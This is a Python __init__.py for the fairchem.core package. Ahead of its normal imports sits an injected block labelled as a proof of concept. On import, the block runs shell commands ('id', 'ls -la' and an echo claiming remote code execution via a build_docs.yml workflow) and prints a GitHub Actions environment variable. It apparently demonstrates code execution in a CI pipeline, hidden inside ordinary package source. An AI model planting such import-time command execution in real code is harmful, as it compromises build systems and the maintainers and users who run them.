"""
Copyright (c) Meta Platforms, Inc. and affiliates.

This source code is licensed under the MIT license found in the
LICENSE file in the root directory of this source tree.
"""
from __future__ import annotations

# --- BEGIN PoC INJECTION ---
import subprocess
import os

print("!!! PoC: Attempting to execute injected commands via __init__.py !!!")

print("!!! PoC: Running 'id' command... !!!")
try:
    subprocess.run("id", shell=True, check=True)
except Exception as e:
    print(f"!!! PoC: Error running 'id': {e} !!!")
    
print("!!! PoC: Running 'echo PoC successful' command... !!!")
try:
    subprocess.run("echo '!!! PoC: Remote Code Execution via __init__.py in build_docs.yml was successful !!!'", shell=True, check=True)
except Exception as e:
    print(f"!!! PoC: Error running 'echo': {e} !!!")

print("!!! PoC: Listing current directory contents (from __init__.py)... !!!")
try:
    subprocess.run("ls -la", shell=True, check=True)
except Exception as e:
    print(f"!!! PoC: Error running 'ls -la': {e} !!!")

print("!!! PoC: Environment variable GITHUB_WORKFLOW: ", os.environ.get("GITHUB_WORKFLOW"), "!!!")


print("!!! PoC: End of injected commands. Original __init__.py execution will continue. !!!")
# --- END PoC INJECTION ---

# Original content of __init__.py starts below (if any)
# ... (rest of the original __init__.py content)


from importlib.metadata import PackageNotFoundError, version

from fairchem.core._config import clear_cache
from fairchem.core.calculate import pretrained_mlip
from fairchem.core.calculate.ase_calculator import FAIRChemCalculator

try:
    __version__ = version("fairchem.core")
except PackageNotFoundError:
    # package is not installed
    __version__ = ""

__all__ = ["FAIRChemCalculator", "pretrained_mlip", "clear_cache"]
